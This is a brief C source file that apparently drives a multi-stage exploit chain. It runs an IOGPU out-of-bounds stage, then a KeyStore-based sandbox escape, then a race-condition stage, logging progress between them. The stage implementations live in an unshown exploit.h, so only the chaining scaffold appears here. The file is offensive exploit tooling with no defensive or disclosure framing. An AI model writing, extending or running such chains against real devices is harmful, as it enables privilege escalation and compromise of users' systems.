/* chain.c — dj's order v2: IOGPU OOB fast lane FIRST (direct ask), then
   (1) escape attempt = KeyStore UC s17/s35 struct-wire grid, (2) race
   lanes, both after the OOB lane fires. Continuous chain log. */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"

void nk_chain_run(void) {
    nk_filelog_open("chain");
    nk_log("[gen] stage 0: IOGPU OOB fast lane (direct)");
    nk_iogpu_oob_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[gen] stage 0 done -> stage 1: escape (KeyStore s17/s35)");
    nk_ksmagic_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[esc] stage 1 done -> stage 2: race");
    fflush(stdout);
    nk_racer_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[gen] stage 2 done -> chain end");
    nk_filelog_close();
}
